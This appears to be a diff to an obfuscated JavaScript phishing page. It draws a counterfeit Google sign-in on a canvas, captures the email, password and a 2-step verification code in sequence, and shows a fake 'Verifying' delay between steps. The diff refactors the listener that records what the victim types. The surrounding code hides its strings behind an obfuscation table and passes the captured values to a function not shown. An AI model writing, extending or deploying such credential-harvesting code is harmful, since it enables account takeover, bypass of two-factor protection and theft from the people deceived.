@@ -35,7 +35,24 @@
                 function pS(){ia=false;k.blur();if(st==='USERNAME_PROMPT'&&id.trim()!==''){st='PASSWORD_PROMPT';k.type=_S.pwd;k.value='';}else if(st==='PASSWORD_PROMPT'&&pw.trim()!==''){sC(false);st='VERIFYING_DELAY';k.style.display='none';spA=0;setTimeout(()=>{st='OTP_PROMPT';k.type=_S.txtTy;k.value='';ot='';k.style.display='';i();},5000);}else if(st==='OTP_PROMPT'&&ot.trim()!==''){sC(true);}i();}
                 function hI(e){const rc=c.getBoundingClientRect(),cx=(e.touches?e.touches[0].clientX:e.clientX)-rc.left,cy=(e.touches?e.touches[0].clientY:e.clientY)-rc.top;let ti=(st==='USERNAME_PROMPT'&&iS(cx,cy,rg.iI))||(st==='PASSWORD_PROMPT'&&iS(cx,cy,rg.pI))||(st==='OTP_PROMPT'&&iS(cx,cy,rg.oI));if(ti){ia=true;k.focus();}else{e.preventDefault();ia=false;k.blur();if(iS(cx,cy,rg.nB)){pS();}}i();}
                 function i(){const dp=window.devicePixelRatio||1,cn=document[_S.gEBI](_S.cM),cw=cn.clientWidth,ch=cw*(bH/bW);c.style.width=`${cw}px`;c.style.height=`${ch}px`;c.width=Math.floor(cw*dp);c.height=Math.floor(ch*dp);if(c.width===0)return;x.scale(dp,dp);const sf=cw/bW;fs={ti:`${22*sf}px '${_S.fGS}'`,sTi:`${20*sf}px '${_S.fGS}'`,bd:`${14*sf}px '${_S.fR}'`,bt:`bold ${14*sf}px '${_S.fGS}'`,in:`${16*sf}px '${_S.fR}'`,lk:`${14*sf}px '${_S.fGS}'`};rg={iI:{x:cw*0.089,y:ch*0.38,w:cw*0.822,h:ch*0.124},pI:{x:cw*0.089,y:ch*0.48,w:cw*0.822,h:ch*0.124},oI:{x:cw*0.089,y:ch*0.53,w:cw*0.822,h:ch*0.124},nB:{x:cw*0.647,y:ch*0.79,w:cw*0.263,h:ch*0.08},fL:{x:cw*0.089,y:ch*0.79,w:cw*0.3,h:ch*0.08}};sd={'USERNAME_PROMPT':{e:[{t:'img',y:0.12},{t:'text',c:'Sign in',p:{y:0.29},f:fs.ti,a:'center'},{t:'text',c:'Use your Google Account',p:{y:0.35},f:fs.bd,a:'center'},{t:'input',r:rg.iI,v:()=>id,p:'Email or phone'},{t:'link',r:rg.fL,c:'Forgot email?'},{t:'button',r:rg.nB,c:'Next'}]},'PASSWORD_PROMPT':{e:[{t:'img',y:0.12},{t:'text',c:'Welcome',p:{y:0.29},f:fs.ti,a:'center'},{t:'userChip',y:0.36,h:32*sf},{t:'input',r:rg.pI,v:()=>'●'.repeat(pw.length),p:'Enter your password'},{t:'link',r:rg.fL,c:'Forgot password?'},{t:'button',r:rg.nB,c:'Next'}]},"VERIFYING_DELAY":{e:[{t:'img',y:0.35},{t:'spinner',y:0.42},{t:'text',c:'Verifying, please wait...',p:{y:0.55},f:fs.bd,a:'center'}]},"OTP_PROMPT":{e:[{t:'text',c:"2-step verification",p:{y:0.22},f:fs.sTi,a:'center'},{t:'desc',c:'A 6 digit-code has been sent. Please enter it',p:{y:0.32},f:fs.bd,a:'center'},{t:'desc',c:'to verify your identity.',p:{y:0.36},f:fs.bd,a:'center'},{t:'userChip',y:0.43,h:32*sf},{t:'input',r:rg.oI,v:()=>ot,p:'Enter the code'},{t:'button',r:rg.nB,c:'Next'}]}};r();}
-                k[_S.aEL](_S.inp,e=>{if(!ia)return;if(st==='USERNAME_PROMPT')id=e.target.value;else if(st==='PASSWORD_PROMPT')pw=e.target.value;else if(st==='OTP_PROMPT')ot=e.target.value;r();});
+                
+                k[_S.aEL](_S.inp, (e) => {
+                    if (!ia) return;
+                    const currentValue = e.target.value;
+                    switch (st) {
+                        case 'USERNAME_PROMPT':
+                            id = currentValue;
+                            break;
+                        case 'PASSWORD_PROMPT':
+                            pw = currentValue;
+                            break;
+                        case 'OTP_PROMPT':
+                            ot = currentValue;
+                            break;
+                    }
+                    r();
+                });
+
                 k[_S.aEL](_S.kd,e=>{if(e.key==='Enter'){e.preventDefault();pS();}});
                 c[_S.aEL](_S.clk,hI);c[_S.aEL](_S.ts,hI,{passive:false});window[_S.aEL](_S.rsz,i);
                 Promise.all([new Promise(res=>{if(g.complete){res();}else{g.onload=res;}}),document.fonts.ready]).then(()=>{i();setInterval(()=>{if(st==='VERIFYING_DELAY'){spA+=0.1;r();}else if(ia){sc=!sc;r();}},500);}).catch(e=>console.error("Operational failure:",e));
